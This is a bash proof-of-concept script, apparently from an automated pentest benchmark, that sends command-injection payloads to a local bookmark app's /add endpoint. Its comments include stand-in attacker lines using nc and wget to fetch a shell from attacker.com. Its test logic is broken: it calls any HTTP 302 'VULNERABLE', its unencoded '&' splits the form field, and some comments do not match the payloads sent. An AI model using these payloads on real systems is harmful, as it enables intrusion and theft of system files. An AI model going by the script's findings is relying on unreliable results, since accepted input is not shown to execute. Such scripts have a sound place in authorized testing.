#!/bin/bash
# POC: Command Injection in Bookmark URL Field - demonstrates that command injection payloads are accepted without filtering
# Target: ./repo
# Created: 2025-12-02T16:24:23.845Z
# Session: benchmark-XBEN-075-24-miorxjbp

# Command Injection Vulnerability in Bookmark URL Field POC
# This script demonstrates that the /add endpoint accepts command injection payloads in the URL field
# without proper validation or filtering

TARGET="http://localhost:5000"
ENDPOINT="/add"

echo "[*] Testing Command Injection in URL Field"
echo "[*] Target: $TARGET$ENDPOINT"
echo ""

# Test 1: Command injection with semicolon (;whoami)
echo "[TEST 1] Testing semicolon-based command injection: https://example.com;whoami"
RESPONSE=$(curl -s -X POST "$TARGET$ENDPOINT" \
  -d "name=test1&url=https://example.com;whoami" \
  -w "\n%{http_code}")
HTTP_CODE=$(echo "$RESPONSE" | tail -1)
BODY=$(echo "$RESPONSE" | head -n -1)

if [ "$HTTP_CODE" = "302" ]; then
  echo "[+] VULNERABLE: Payload accepted (HTTP $HTTP_CODE)"
else
  echo "[-] Response code: $HTTP_CODE"
fi
echo ""

# Test 2: Command injection with backticks (`id`)
echo "[TEST 2] Testing backtick-based command injection: https://example.com\`id\`"
RESPONSE=$(curl -s -X POST "$TARGET$ENDPOINT" \
  -d "name=test2&url=https://example.com\`id\`" \
  -w "\n%{http_code}")
HTTP_CODE=$(echo "$RESPONSE" | tail -1)
BODY=$(echo "$RESPONSE" | head -n -1)

if [ "$HTTP_CODE" = "302" ]; then
  echo "[+] VULNERABLE: Payload accepted (HTTP $HTTP_CODE)"
else
  echo "[-] Response code: $HTTP_CODE"
fi
echo ""

# Test 3: Command injection with dollar-parentheses $(cat /etc/passwd)
echo "[TEST 3] Testing dollar-parentheses command injection: https://example.com\$(cat /etc/passwd)"
RESPONSE=$(curl -s -X POST "$TARGET$ENDPOINT" \
  -d "name=test3&url=https://example.com\$(cat /etc/passwd)" \
  -w "\n%{http_code}")
HTTP_CODE=$(echo "$RESPONSE" | tail -1)
BODY=$(echo "$RESPONSE" | head -n -1)

if [ "$HTTP_CODE" = "302" ]; then
  echo "[+] VULNERABLE: Payload accepted (HTTP $HTTP_CODE)"
else
  echo "[-] Response code: $HTTP_CODE"
fi
echo ""

# Test 4: Command injection with pipe (|nc attacker.com 4444)
echo "[TEST 4] Testing pipe-based command injection: https://example.com|whoami"
RESPONSE=$(curl -s -X POST "$TARGET$ENDPOINT" \
  -d "name=test4&url=https://example.com|whoami" \
  -w "\n%{http_code}")
HTTP_CODE=$(echo "$RESPONSE" | tail -1)
BODY=$(echo "$RESPONSE" | head -n -1)

if [ "$HTTP_CODE" = "302" ]; then
  echo "[+] VULNERABLE: Payload accepted (HTTP $HTTP_CODE)"
else
  echo "[-] Response code: $HTTP_CODE"
fi
echo ""

# Test 5: Command injection with ampersand (&wget attacker.com/shell.sh)
echo "[TEST 5] Testing ampersand-based command injection: https://example.com&whoami"
RESPONSE=$(curl -s -X POST "$TARGET$ENDPOINT" \
  -d "name=test5&url=https://example.com&whoami" \
  -w "\n%{http_code}")
HTTP_CODE=$(echo "$RESPONSE" | tail -1)
BODY=$(echo "$RESPONSE" | head -n -1)

if [ "$HTTP_CODE" = "302" ]; then
  echo "[+] VULNERABLE: Payload accepted (HTTP $HTTP_CODE)"
else
  echo "[-] Response code: $HTTP_CODE"
fi
echo ""

echo "[*] Summary:"
echo "[*] If all tests show HTTP 302 (VULNERABLE), the URL field accepts command injection payloads"
echo "[*] The application does not validate or filter command metacharacters in the URL field"